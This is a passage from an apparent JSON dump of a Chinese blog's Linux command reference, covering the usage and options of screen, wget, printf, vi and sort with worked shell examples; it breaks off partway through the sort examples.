[root@TS-DEV ~]# yum install screen [root@TS-DEV ~]# rpm -qa|grep screen screen-4.0.3-4.el5 [root@TS-DEV ~]# 创建一个新的窗口 安装完成后，直接敲命令 screen 就可以启动它。但是这样启动的 screen 会话没有名字，实践上推荐为每个 screen 会话取一个名字，方便分辨： [root@TS-DEV ~]# screen -S david screen 启动后，会创建第一个窗口，也就是窗口 No. 0，并在其中打开一个系统默认的 shell，一般都会是 bash。所以你敲入命令 screen 之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入 Screen 的世界了。当然，也可以在 screen 命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如： [root@TS-DEV ~]# screen vi david.txt screen 创建一个执行 vi david.txt 的单窗口会话，退出 vi 将退出该窗口/会话。 查看窗口和窗口名称 打开多个窗口后，可以使用快捷键 C-a w 列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用 X 环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样： 0$ bash 1-$ bash 2*$ bash 这个例子中我开启了三个窗口，其中*号表示当前位于窗口 2，-号表示上一次切换窗口时位于窗口 1。 Screen 默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键 C-a A 来为当前窗口重命名，按下快捷键后，Screen 会允许你为当前窗口输入新的名字，回车确认。 会话分离与恢复 你可以不中断 screen 窗口中程序的运行而暂时断开（detach）screen 会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个 screen 窗口编辑/tmp/david.txt 文件： [root@TS-DEV ~]# screen vi /tmp/david.txt 之后我们想暂时退出做点别的事情，比如出去散散步，那么在 screen 窗口键入 C-a d，Screen 会给出 detached 提示： 暂时中断会话 半个小时之后回来了，找到该 screen 会话： [root@TS-DEV ~]# screen -ls 重新连接会话： [root@TS-DEV ~]# screen -r 12865 一切都在。 当然，如果你在另一台机器上没有分离一个 Screen 会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来： 清除 dead 会话 如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时 screen -list 会显示该会话为 dead 状态。使用 screen -wipe 命令清除该会话： 关闭或杀死窗口 正常情况下，当你退出一个窗口中最后一个程序（通常是 bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用 C-a k，这个快捷键杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。 如果一个 Screen 会话中最后一个窗口被关闭了，那么整个 Screen 会话也就退出了，screen 进程会被终止。 除了依次退出/杀死当前 Screen 会话中所有窗口这种方法之外，还可以使用快捷键 C-a :，然后输入 quit 命令退出 Screen 会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实 C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入 split 等，这也是实现 Screen 功能的一个途径，不过个人认为还是快捷键比较方便些。 screen 高级应用 会话共享 还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个 screen 会话，你朋友可以在他的终端上命令： [root@TS-DEV ~]# screen -x 这个命令会将你朋友的终端 Attach 到你的 Screen 会话上，并且你的终端不会被 Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。 会话锁定与解锁 Screen 允许使用快捷键 C-a s 锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被 Screen 中的进程接收到。快捷键 C-a q 可以解锁一个会话。 也可以使用 C-a x 锁定会话，不同的是这样锁定之后，会话会被 Screen 所属用户的密码保护，需要输入密码才能继续访问这个会话。 发送命令到 screen 会话 在 Screen 会话之外，可以通过 screen 命令操作一个 Screen 会话，这也为使用 Screen 作为脚本程序增加了便利。关于 Screen 在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对 Screen 的操作： [root@TS-DEV ~]# screen -S sandy -X screen ping www.baidu.com 这个命令在一个叫做 sandy 的 screen 会话中创建一个新窗口，并在其中运行 ping 命令。 屏幕分割 现在显示器那么大，将一个屏幕分割成不同区域显示不同的 Screen 窗口显然是个很酷的事情。可以使用快捷键 C-a S 将显示器水平分割，Screen 4.00.03 版本以后，也支持垂直分屏，快捷键是 C-a |。分屏以后，可以使用 C-a 在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。 可以用 C-a X 快捷键关闭当前焦点所在的屏幕区块，也可以用 C-a Q 关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。 C/P 模式和操作 screen 的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键 C-a 或者 C-a [可以进入 copy/paste 模式，这个模式下可以像在 vi 中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似 vi 的操作，譬如使用/进行搜索，使用 y 快速标记一行，使用 w 快速标记一个单词等。关于 C/P 模式下的高级操作，其文档的这一部分有比较详细的说明。 一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在 copy/paste buffer 中，并退出 copy/paste 模式。在正常模式下，可以使用快捷键 C-a ] 将储存在 buffer 中的内容粘贴到当前窗口。 更多 screen 功能 同大多数 UNIX 程序一样，GNU Screen 提供了丰富强大的定制功能。你可以在 Screen 的默认两级配置文件/etc/screenrc 和$HOME/.screenrc 中指定更多，例如设定 screen 选项，定制绑定键，设定 screen 会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定 screen 配置文件。 以多用户功能为例，screen 默认是以单用户模式运行的，你需要在配置文件中指定 multiuser on 来打开多用户模式，通过 acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的 screen 会话。更多配置文件内容请参考 screen 的 man 页。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"screen","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/screen/","stats":{"text":"13 min read","time":765000,"words":3423,"minutes":13},"date":"2022-02-02 03:47:49","dateFormat":"2022-02-02"},{"content":"Linux 系统下载文件工具。 补充说明 wget 命令用来从指定的 URL 下载文件。wget 非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget 会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。 wget 支持 HTTP，HTTPS 和 FTP 协议，可以使用 HTTP 代理。所谓的自动下载是指，wget 可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个 wget 下载任务，然后退出系统，wget 将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。 用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget 虽然功能强大，但是使用起来还是比较简单： 支持断点下传功能 这一点，也是网络蚂蚁和 FlashGet 当年最大的卖点，现在，Wget 也可以使用此功能，那些网络不是太好的用户可以放心了； 同时支持 FTP 和 HTTP 下载方式 尽管现在大部分软件可以使用 HTTP 方式下载，但是，有些时候，仍然需要使用 FTP 方式下载软件； 支持代理服务器 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能； 设置方便简单 可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标； 程序小，完全免费 程序小可以考虑不计，因为现在的硬盘实在太大了； 完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。 语法 wget [参数 ] [URL 地址 ] 选项 启动参数： -V, –-version 显示 wget 的版本后退出 -h, –-help 打印语法帮助 -b, –-background 启动后转入后台执行 -e, –-execute=COMMAND 执行 `.wgetrc’格式的命令，wgetrc 格式参见/etc/wgetrc 或~/.wgetrc 记录和输入文件参数： -o, –-output-file=FILE 把记录写到 FILE 文件中 -a, –-append-output=FILE 把记录追加到 FILE 文件中 -d, –-debug 打印调试输出 -q, –-quiet 安静模式 (没有输出) -v, –-verbose 冗长模式 (这是缺省设置) -nv, –-non-verbose 关掉冗长模式，但不是安静模式 -i, –-input-file=FILE 下载在 FILE 文件中出现的 URLs -F, –-force-html 把输入文件当作 HTML 格式文件对待 -B, –-base=URL 将 URL 作为在-F -i 参数指定的文件中出现的相对链接的前缀 –-sslcertfile=FILE 可选客户端证书 –-sslcertkey=KEYFILE 可选客户端证书的 KEYFILE –-egd-file=FILE 指定 EGD socket 的文件名 下载参数： –-bind-address=ADDRESS 指定本地使用地址 (主机名或 IP，当本地有多个 IP 或名字时使用) -t, –-tries=NUMBER 设定最大尝试链接次数 (0 表示无限制). -O –-output-document=FILE 把文档写到 FILE 文件中 -nc, –-no-clobber 不要覆盖存在的文件或使用.#前缀 -c, –-continue 接着下载没下载完的文件 –progress=TYPE 设定进程条标记 -N, –-timestamping 不要重新下载文件除非比本地文件新 -S, –-server-response 打印服务器的回应 –-spider 不下载任何东西 -T, –-timeout=SECONDS 设定响应超时的秒数 -w, –-wait=SECONDS 两次尝试之间间隔 SECONDS 秒 –waitretry=SECONDS 在重新链接之间等待 1…SECONDS 秒 –random-wait 在下载之间等待 0…2*WAIT 秒 -Y, –-proxy=on/off 打开或关闭代理 -Q, –-quota=NUMBER 设置下载的容量限制 –limit-rate=RATE 限定下载输率 目录参数： -nd –-no-directories 不创建目录 -x, –-force-directories 强制创建目录 -nH, –-no-host-directories 不创建主机目录 -P, –-directory-prefix=PREFIX 将文件保存到目录 PREFIX/… –cut-dirs=NUMBER 忽略 NUMBER 层远程目录 HTTP 选项参数： -–http-user=USER 设定 HTTP 用户名为 USER. -–http-passwd=PASS 设定 http 密码为 PASS -C, –-cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许) -E, –-html-extension 将所有 text/html 文档以.html 扩展名保存 -–ignore-length 忽略 `Content-Length’头域 -–header=STRING 在 headers 中插入字符串 STRING -–proxy-user=USER 设定代理的用户名为 USER -–proxy-passwd=PASS 设定代理的密码为 PASS -–referer=URL 在 HTTP 请求中包含 `Referer: URL’头 -s, –-save-headers 保存 HTTP 头到文件 -U, –-user-agent=AGENT 设定代理的名称为 AGENT 而不是 Wget/VERSION -–no-http-keep-alive 关闭 HTTP 活动链接 (永远链接) –-cookies=off 不使用 cookies –-load-cookies=FILE 在开始会话前从文件 FILE 中加载 cookie -–save-cookies=FILE 在会话结束后将 cookies 保存到 FILE 文件中 FTP 选项参数： -nr, -–dont-remove-listing 不移走 `.listing’文件 -g, -–glob=on/off 打开或关闭文件名的 globbing 机制 -–passive-ftp 使用被动传输模式 (缺省值). -–active-ftp 使用主动传输模式 -–retr-symlinks 在递归的时候，将链接指向文件 (而不是目录) 递归下载参数： -r, -–recursive 递归下载－－慎用! -l, -–level=NUMBER 最大递归深度 (inf 或 0 代表无穷) –-delete-after 在现在完毕后局部删除文件 -k, –-convert-links 转换非相对链接为相对链接 -K, –-backup-converted 在转换文件 X 之前，将之备份为 X.orig -m, –-mirror 等价于 -r -N -l inf -nr -p, –-page-requisites 下载显示 HTML 文件的所有图片 递归下载中的包含和不包含 (accept/reject)： -A, –-accept=LIST 分号分隔的被接受扩展名的列表 -R, –-reject=LIST 分号分隔的不被接受的扩展名的列表 -D, –-domains=LIST 分号分隔的被接受域的列表 –-exclude-domains=LIST 分号分隔的不被接受的域的列表 –-follow-ftp 跟踪 HTML 文档中的 FTP 链接 –-follow-tags=LIST 分号分隔的被跟踪的 HTML 标签的列表 -G, –-ignore-tags=LIST 分号分隔的被忽略的 HTML 标签的列表 -H, –-span-hosts 当递归时转到外部主机 -L, –-relative 仅仅跟踪相对链接 -I, –-include-directories=LIST 允许目录的列表 -X, –-exclude-directories=LIST 不被包含目录的列表 -np, –-no-parent 不要追溯到父目录 wget -S –-spider url 不下载只显示过程 参数 URL：下载指定的 URL 地址。 实例 使用 wget 下载单个文件 wget http://www.example.com/testfile.zip 以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。 下载并以不同的文件名保存 wget -O wordpress.zip http://www.example.com/download.aspx?id=1080 wget 默认会以最后一个符合/的后面的字符来命令，对于动态链接的下载通常文件名会不正确。 错误：下面的例子会下载一个文件并以名称download.aspx?id=1080保存: wget http://www.example.com/download?id=1 即使下载的文件是 zip 格式，它仍然以download.php?id=1080命令。 正确：为了解决这个问题，我们可以使用参数-O来指定一个文件名： wget -O wordpress.zip http://www.example.com/download.aspx?id=1080 wget 限速下载 wget --limit-rate=300k http://www.example.com/testfile.zip 当你执行 wget 的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。 使用 wget 断点续传 wget -c http://www.example.com/testfile.zip 使用wget -c重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用-c参数。 使用 wget 后台下载 wget -b http://www.example.com/testfile.zip Continuing in background, pid 1840. Output will be written to `wget-log'. 对于下载非常大的文件的时候，我们可以使用参数-b进行后台下载，你可以使用以下命令来察看下载进度： tail -f wget-log 伪装代理名称下载 wget --user-agent=&quot;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16&quot; http://www.example.com/testfile.zip 有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过--user-agent参数伪装。 测试下载链接 当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加--spider参数进行检查。 wget --spider URL 如果下载链接正确，将会显示: Spider mode enabled. Check if remote file exists. HTTP request sent, awaiting response... 200 OK Length: unspecified [text/html] Remote file exists and could contain further links, but recursion is disabled -- not retrieving. 这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误: wget --spider url Spider mode enabled. Check if remote file exists. HTTP request sent, awaiting response... 404 Not Found Remote file does not exist -- broken link!!! 你可以在以下几种情况下使用--spider参数： 定时下载之前进行检查 间隔检测网站是否可用 检查网站页面的死链接 增加重试次数 wget --tries=40 URL 如果网络有问题或下载一个大文件也有可能失败。wget 默认重试 20 次连接下载文件。如果需要，你可以使用--tries增加重试次数。 下载多个文件 wget -i filelist.txt 首先，保存一份下载链接文件： cat &gt; filelist.txt url1 url2 url3 url4 接着使用这个文件和参数-i下载。 镜像网站 wget --mirror -p --convert-links -P ./LOCAL URL 下载整个网站到本地。 --miror开户镜像下载。 -p下载所有为了 html 页面显示正常的文件。 --convert-links下载后，转换成本地的链接。 -P ./LOCAL保存所有文件和目录到本地指定目录。 过滤指定格式下载 wget --reject=gif ur 下载一个网站，但你不希望下载图片，可以使用这条命令。 把下载信息存入日志文件 wget -o download.log URL 不希望下载信息直接显示在终端而是在一个日志文件，可以使用。 限制总下载文件大小 wget -Q5m -i filelist.txt 当你想要下载的文件超过 5M 而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。 下载指定格式文件 wget -r -A.pdf url 可以在以下情况使用该功能： 下载一个网站的所有图片。 下载一个网站的所有视频。 下载一个网站的所有 PDF 文件。 FTP 下载 wget ftp-url wget --ftp-user=USERNAME --ftp-password=PASSWORD url 可以使用 wget 来完成 ftp 链接的下载。 使用 wget 匿名 ftp 下载： wget ftp-url 使用 wget 用户名和密码认证的 ftp 下载： wget --ftp-user=USERNAME --ftp-password=PASSWORD url ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"wget","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/wget/","stats":{"text":"12 min read","time":690000,"words":2922,"minutes":12},"date":"2022-02-02 03:42:49","dateFormat":"2022-02-02"},{"content":"格式化并输出结果。 内建命令 概要 printf [-v var] format [arguments] 主要用途 格式化参数并输出。 选项 -v var：将结果输出到变量 var 中而不是输出到标准输出。 参数 format：输出格式。 arguments：一到多个参数。 转义序列：除了支持 printf(1) 和 printf(3) 的转义序列，内建 printf 还支持以下转义序列： %b 展开参数中的反斜杠转义字符。 %q 将参数扩起以用作 shell 输入。 %(fmt)T 根据 strftime(3) 中的转义字符来输出日期时间字符串。 返回值 返回状态为成功除非给出了非法选项、写错误、赋值错误。 例子 # %-5s 格式为左对齐且宽度为 5 的字符串代替（'-' 表示左对齐），不使用则默认右对齐。 # %-4.2f 格式为左对齐宽度为 4，保留两位小数。 printf &quot;%-5s %-10s %-4s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; NO Name Mark printf &quot;%-5s %-10s %-4.2f&lt;span title=&quot;\\n&quot;&gt;\\n&quot; 01 Tom 90.3456 printf &quot;%-5s %-10s %-4.2f&lt;span title=&quot;\\n&quot;&gt;\\n&quot; 02 Jack 89.2345 printf &quot;%-5s %-10s %-4.2f&lt;span title=&quot;\\n&quot;&gt;\\n&quot; 03 Jeff 98.4323 # 输出 NO Name Mark 01 Tom 90.35 02 Jack 89.23 03 Jeff 98.43 # %b %q %(fmt)T 的例子。 # see it again with a newline. printf &quot;%s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; 'hello world' # 展开换行符，和上面的结果一样。 printf &quot;%b&quot; 'hello world&lt;span title=&quot;\\n&quot;&gt;\\n' printf '%q&lt;span title=&quot;\\n&quot;&gt;\\n' 'a b c' # 输出 a\\ b\\ c # %z 为时区，%n 为换行符。 printf &quot;%(%F %T %z%n)T&quot; # 输出 2019-09-10 01:48:07 +0000 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 外部命令 概要 printf FORMAT [ARGUMENT]... printf OPTION 主要用途 格式化参数并输出。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 format：输出格式。 arguments：一到多个参数。 在这里忽略了（%b %q），如果你安装的 coreutils 版本支持它们，那么请参考上面的例子。 支持的转义序列： \\&quot; 双引号 \\\\ 反斜杠 \\a 响铃 \\b 退格 \\c 截断输出 \\e 退出 \\f 翻页 \\n 换行 \\r 回车 \\t 水平制表符 \\v 竖直制表符 \\NNN 八进制数 (1 到 3 位数字) \\xHH 十六进制数 (1 到 2 位数字) \\uHHHH Unicode 字符附加 4 位十六进制数字 \\UHHHHHHHH Unicode 字符附加 8 位十六进制数字 %% 百分号 以及 'diouxXfeEgGcs' 中的一个结尾的 C 格式规范，将被转换为正确的类型并处理可变宽度。 例子 # 使用 /usr/bin/printf 确保调用的不是内建命令。 # 当然，在你关闭内建 printf 以及确认当前环境没有 printf 函数的情况下，可直接使用 printf，详见末尾&quot;注意&quot;的链接。 # 按行打印数组和关联数组的下标及值。 # 声明数组可以不加 'declare -a' 或 'local -a'（在函数内声明的局部变量）。 arr=('line1' 'line2') /usr/bin/printf &quot;%s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; ${!arr[@]} # 输出下标 0 1 /usr/bin/printf &quot;%s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; ${arr[@]} # 输出值 line1 line2 #声明关联数组（也就是字典）必须加 'declare -A' 或 'local -A'（在函数内声明的局部变量）。 declare -A assoc_arr=(['key1']='value1' ['key2']='value2') /usr/bin/printf &quot;%s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; ${!assoc_arr[@]} # 输出键。 key2 key1 /usr/bin/printf &quot;%s&lt;span title=&quot;\\n&quot;&gt;\\n&quot; ${assoc_arr[@]} # 输出值。 value2 value1 返回值 返回状态为成功除非给出了非法选项等。 注意 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 printf或info coreutils 'pwd invocation'。 启动或关闭内建命令请查看enable命令，关于同名优先级的问题请查看builtin命令的例子部分的相关讨论。 我通过和bug-bash@gnu.org的交流，得到了关于这几个格式说明符%b %q %(fmt)T的解释： printf(1) 中的%b 格式说明符是 printf(3) 支持的格式之外增加的一个 POSIX 特性。 %q 和%T 说明符是非标准的，并且不受所有独立实现的 printf 的支持。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"printf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/printf/","stats":{"text":"5 min read","time":273000,"words":1062,"minutes":5},"date":"2022-02-02 03:38:17","dateFormat":"2022-02-02"},{"content":"功能强大的纯文本编辑器。 补充说明 vi 命令是 UNIX 操作系统和类 UNIX 操作系统中最通用的全屏幕纯文本编辑器。Linux 中的 vi 编辑器叫 vim，它是 vi 的增强版（vi Improved），与 vi 编辑器完全兼容，而且实现了很多增强功能。 vi 编辑器支持编辑模式和命令模式，编辑模式下可以完成文本的编辑功能，命令模式下可以完成对文件的操作命令，要正确使用 vi 编辑器就必须熟练掌握着两种模式的切换。默认情况下，打开 vi 编辑器后自动进入命令模式。从编辑模式切换到命令模式使用“esc”键，从命令模式切换到编辑模式使用“A”、“a”、“O”、“o”、“I”、“i”键。 vi 编辑器提供了丰富的内置命令，有些内置命令使用键盘组合键即可完成，有些内置命令则需要以冒号“：”开头输入。常用内置命令如下： Ctrl+u：向文件首翻半屏； Ctrl+d：向文件尾翻半屏； Ctrl+f：向文件尾翻一屏； Ctrl+b：向文件首翻一屏； Esc：从编辑模式切换到命令模式； ZZ：命令模式下保存当前文件所做的修改后退出 vi； :行号：光标跳转到指定行的行首； :$：光标跳转到最后一行的行首； x 或 X：删除一个字符，x 删除光标后的，而 X 删除光标前的； D：删除从当前光标到光标所在行尾的全部字符； dd：删除光标行正行内容； ndd：删除当前行及其后 n-1 行； nyy：将当前行及其下 n 行的内容保存到寄存器？中，其中？为一个字母，n 为一个数字； p：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方； P：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方； /字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示； ？字符串：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示； a，bs/F/T：替换文本操作，用于在第 a 行到第 b 行之间，将 F 字符串换成 T 字符串。其中，“s/”表示进行替换操作； a：在当前字符后添加文本； A：在行末添加文本； i：在当前字符前插入文本； I：在行首插入文本； o：在当前行后面插入一空行； O：在当前行前面插入一空行； :wq：在命令模式下，执行存盘退出操作； :w：在命令模式下，执行存盘操作； :w！：在命令模式下，执行强制存盘操作； :q：在命令模式下，执行退出 vi 操作； :q！：在命令模式下，执行强制退出 vi 操作； :e 文件名：在命令模式下，打开并编辑指定名称的文件； :n：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件； :f：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例； :set number：在命令模式下，用于在最左端显示行号； :set nonumber：在命令模式下，用于在最左端不显示行号； 语法 vi (选项) (参数) 选项 +&lt;行号&gt;：从指定行号的行开始显示文本内容； -b：以二进制模式打开文件，用于编辑二进制文件和可执行文件； -c&lt;指令&gt;：在完成对第一个文件编辑任务后，执行给出的指令； -d：以 diff 模式打开文件，当多个文件编辑时，显示文件差异部分； -l：使用 lisp 模式，打开“lisp”和“showmatch”； -m：取消写文件功能，重设“write”选项； -M：关闭修改功能； -n：不实用缓存功能； -o&lt;文件数目&gt;：指定同时打开指定数目的文件； -R：以只读方式打开文件； -s：安静模式，不现实指令的任何错误信息。 参数 文件列表：指定要编辑的文件列表。多个文件之间使用空格分隔开。 知识扩展 vi 编辑器有三种工作方式：命令方式、输入方式和 ex 转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。 命令方式 在 Shell 提示符后输入命令 vi，进入 vi 编辑器，并处于 vi 的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x 表示删除字符命令等。如果输入的字符不是 vi 的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即 vi 命令）并不在屏幕上显示出来，例如，输入 i，屏幕上并无变化，但通过执行 i 命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。 输入方式 通过输入 vi 的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令 (c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母 i，进到输入方式，然后再输入 i，就在屏幕上相应光标处添加一个字母 i。 由输入方式回到命令方式的办法是按下 Esc 键。如果已在命令方式下，那么按下 Esc 键就会发出“嘟嘟”声。为了确保用户想执行的 vi 命令是在命令方式下输入的，不妨多按几下 Esc 键，听到嘟声后再输入命令。 ex 转义方式 vi 和 ex 编辑器的功能是相同的，二者的主要区别是用户界面。在 vi 中，命令通常是单个字母，如 a,x,r 等。而在 ex 中，命令是以 Enter；键结束的命令行。vi 有一个专门的“转义”命令，可访问很多面向行的 ex 命令。为使用 ex 转义方式，可输入一个冒号（:）。作为 ex 命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是 Del 键），可终止正在执行的命令。多数文件管理命令都是在 ex 转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如： :1,$s/I/i/g 按 Enter 键 则从文件第一行至文件末尾（$）将大写 I 全部替换成小写 i。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vi","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vi/","stats":{"text":"7 min read","time":399000,"words":1867,"minutes":7},"date":"2022-02-02 03:33:13","dateFormat":"2022-02-02"},{"content":"对文本文件中所有行进行排序。 概要 sort [OPTION]... [FILE]... sort [OPTION]... --files0-from=F 主要用途 将所有输入文件的内容排序后并输出。 当没有文件或文件为-时，读取标准输入。 选项 排序选项： -b, --ignore-leading-blanks 忽略开头的空白。 -d, --dictionary-order 仅考虑空白、字母、数字。 -f, --ignore-case 将小写字母作为大写字母考虑。 -g, --general-numeric-sort 根据数字排序。 -i, --ignore-nonprinting 排除不可打印字符。 -M, --month-sort 按照非月份、一月、十二月的顺序排序。 -h, --human-numeric-sort 根据存储容量排序 (注意使用大写字母，例如：2K 1G)。 -n, --numeric-sort 根据数字排序。 -R, --random-sort 随机排序，但分组相同的行。 --random-source=FILE 从 FILE 中获取随机长度的字节。 -r, --reverse 将结果倒序排列。 --sort=WORD 根据 WORD 排序，其中: general-numeric 等价于 -g，human-numeric 等价于 -h，month 等价于 -M，numeric 等价于 -n，random 等价于 -R，version 等价于 -V。 -V, --version-sort 文本中 (版本) 数字的自然排序。 其他选项： --batch-size=NMERGE 一次合并最多 NMERGE 个输入；超过部分使用临时文件。 -c, --check, --check=diagnose-first 检查输入是否已排序，该操作不会执行排序。 -C, --check=quiet, --check=silent 类似于 -c 选项，但不输出第一个未排序的行。 --compress-program=PROG 使用 PROG 压缩临时文件；使用 PROG -d 解压缩。 --debug 注释用于排序的行，发送可疑用法的警报到 stderr。 --files0-from=F 从文件 F 中读取以 NUL 结尾的所有文件名称；如果 F 是 - ，那么从标准输入中读取名字。 -k, --key=KEYDEF 通过一个 key 排序；KEYDEF 给出位置和类型。 -m, --merge 合并已排序文件，之后不再排序。 -o, --output=FILE 将结果写入 FILE 而不是标准输出。 -s, --stable 通过禁用最后的比较来稳定排序。 -S, --buffer-size=SIZE 使用 SIZE 作为内存缓存大小。 -t, --field-separator=SEP 使用 SEP 作为列的分隔符。 -T, --temporary-directory=DIR 使用 DIR 作为临时目录，而不是 $TMPDIR 或 /tmp；多次使用该选项指定多个临时目录。 --parallel=N 将并发运行的排序数更改为 N。 -u, --unique 同时使用-c，严格检查排序；不同时使用-c，输出排序后去重的结果。 -z, --zero-terminated 设置行终止符为 NUL（空），而不是换行符。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 KEYDEF 的格式为：F[.C][OPTS][,F[.C][OPTS]] ，表示开始到结束的位置。 F 表示列的编号 C 表示 OPTS 为[bdfgiMhnRrV] 中的一到多个字符，用于覆盖当前排序选项。 使用--debug 选项可诊断出错误的用法。 SIZE 可以有以下的乘法后缀: % 内存的 1%； b 1； K 1024（默认）； 剩余的 M, G, T, P, E, Z, Y 可以类推出来。 参数 FILE（可选）：要处理的文件，可以为任意数量。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 sort 将文件/文本的每一行作为一个单位相互比较，比较原则是从首字符向后依次按 ASCII 码值进行比较，最后将他们按升序输出。 root@[mail text]# cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 [root@mail text]# sort sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 忽略相同行使用-u选项或者uniq： [root@mail text]# cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 [root@mail text]# sort -u sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 [root@mail text]# uniq sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 sort的-n、-r、-k、-t选项的使用： [root@mail text]# cat 